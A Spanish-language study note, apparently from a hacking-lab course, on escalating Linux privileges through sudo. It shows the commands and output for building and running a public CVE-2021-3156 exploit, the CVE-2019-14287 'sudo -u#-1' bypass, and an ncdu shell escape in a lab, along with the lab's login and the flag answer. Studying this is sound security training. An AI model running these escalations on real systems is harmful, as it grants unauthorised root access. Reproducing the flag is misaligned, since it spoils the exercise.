
# Sudo Zeroday

## <mark style="color:purple;">Sudo</mark>

El programa `sudo` se utiliza en sistemas operativos UNIX como Linux o macOS para iniciar procesos con los derechos de otro usuario. En la mayoría de los casos, se ejecutan comandos que solo están disponibles para los administradores. Sirve como una capa adicional de seguridad o una salvaguarda para evitar que el sistema y su contenido sean dañados por usuarios no autorizados. El archivo `/etc/sudoers` especifica qué usuarios o grupos tienen permiso para ejecutar programas específicos y con qué privilegios.

```shell-session
cry0l1t3@nix02:~$ sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
[sudo] password for cry0l1t3:  **********

Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
Defaults        use_pty
root            ALL=(ALL:ALL) ALL
%admin          ALL=(ALL) ALL
%sudo           ALL=(ALL:ALL) ALL
cry0l1t3        ALL=(ALL) /usr/bin/id
@includedir     /etc/sudoers.d
```

Una de las últimas vulnerabilidades de `sudo` lleva el CVE-2021-3156 y se basa en una vulnerabilidad de desbordamiento de búfer. Esto afectó a las versiones de sudo:

* `1.8.31 - Ubuntu 20.04`
* `1.8.27 - Debian 10`
* `1.9.2 - Fedora 33`
* `y otros`

Para saber la versión de `sudo`, basta con el siguiente comando:

```shell-session
cry0l1t3@nix02:~$ sudo -V | head -n1

Sudo version 1.8.31
```

Lo interesante de esta vulnerabilidad es que estuvo presente durante más de diez años hasta que se descubrió. También existe una [prueba de concepto](https://github.com/blasty/CVE-2021-3156) pública que se puede utilizar para esto. Podemos descargarla en una copia del sistema de destino que hayamos creado o, si tenemos una conexión a Internet, en el propio sistema de destino.

```shell-session
cry0l1t3@nix02:~$ git clone https://github.com/blasty/CVE-2021-3156.git
cry0l1t3@nix02:~$ cd CVE-2021-3156
cry0l1t3@nix02:~$ make

rm -rf libnss_X
mkdir libnss_X
gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
```

Al ejecutar el exploit, se nos mostrará una lista que enumerará todas las versiones disponibles de los sistemas operativos que pueden verse afectados por esta vulnerabilidad.

```shell-session
cry0l1t3@nix02:~$ ./sudo-hax-me-a-sandwich

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

  usage: ./sudo-hax-me-a-sandwich <target>

  available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------

  manual mode:
    ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>
```

Podemos saber con qué versión del sistema operativo estamos tratando utilizando el siguiente comando:

```shell-session
cry0l1t3@nix02:~$ cat /etc/lsb-release

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.1 LTS"
```

A continuación, especificamos el ID correspondiente a la versión del sistema operativo y ejecutamos el exploit con nuestro payload:

```shell-session
cry0l1t3@nix02:~$ ./sudo-hax-me-a-sandwich 1

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

using target: Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
** pray for your rootshell.. **

# id

uid=0(root) gid=0(root) groups=0(root)
```

***

## <mark style="color:purple;">Omisión de la política de Sudo</mark>

En 2019 se encontró otra vulnerabilidad que afectaba a todas las versiones anteriores `1.8.28` y que permitía escalar privilegios incluso con un comando simple. Esta vulnerabilidad tiene el [código CVE-2019-14287](https://www.sudo.ws/security/advisories/minus_1_uid/) y solo requiere un único requisito previo: permitir que un usuario del archivo `/etc/sudoers` ejecute un comando específico.

```shell-session
cry0l1t3@nix02:~$ sudo -l
[sudo] password for cry0l1t3: **********

User cry0l1t3 may run the following commands on Penny:
    ALL=(ALL) /usr/bin/id
```

De hecho, `Sudo` también permite ejecutar comandos con identificadores de usuario específicos, lo que ejecuta el comando con los privilegios del usuario que lleva el identificador especificado. El identificador del usuario específico se puede leer desde el archivo `/etc/passwd`.

```shell-session
cry0l1t3@nix02:~$ cat /etc/passwd | grep cry0l1t3

cry0l1t3:x:1005:1005:cry0l1t3,,,:/home/cry0l1t3:/bin/bash
```

Por lo tanto, el ID del usuario `cry0l1t3`sería `1005`. Si se introduce un ID negativo (`-1`) en `sudo`, se procesa el ID `0`, que solo tiene `root`. Por lo tanto, esto conduce al shell raíz inmediato.

```shell-session
cry0l1t3@nix02:~$ sudo -u#-1 id

root@nix02:/home/cry0l1t3# id

uid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)
```

***

## <mark style="color:purple;">Caso práctico</mark>

```
SSH a 10.129.176.243 (ACADEMY-LLPE-SUDO)
Usuario "htb-student"
Contraseña "HTB_@cademy_stdnt!"
```

Aumente los privilegios y envíe el contenido de flag.txt como respuesta.

Al acceder por SSH comprobamos los permisos de ejecución y vemos que podemos ejecutar ncdu como root:

```shell-session
$ sudo -l
[sudo] password for htb-student: 
Matching Defaults entries for htb-student on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ubuntu:
    (ALL, !root) /bin/ncdu
```

NCDU es un explorador de archivos con varias funcionalidades. Echándole un vistazo a GTFOBins encontramos algo curioso que podríamos utilizar:

{% embed url="<https://gtfobins.github.io/gtfobins/ncdu/>" %}

Necesitamos saber la ruta completa al binario, lo podemos saber con:

```shell-session
$ find / -name "ncdu" 2>/dev/null   
/usr/bin/ncdu
```

Ahora vamos a ejecutar ncdu de la siguiente manera, con lo que le indicamos que lo ejecute como el usuario root:

```shell-session
$ sudo -u#-1 /usr/bin/ncdu /home/htb-student/
```

Una vez que se abre solo tenemos que pulsar la tecla `b` para lanzar una shell como root:

<figure><img src="/files/rUcb8oIhKCpZf0vUHThg" alt=""><figcaption></figcaption></figure>

```shell-session
# whoami
root
# id
uid=0(root) gid=1001(htb-student) groups=1001(htb-student)
```

```shell-session
# cd /root
# ls
flag.txt  snap
# cat flag.txt  
HTB{SuD0_eSc4l4710n_1id}
```
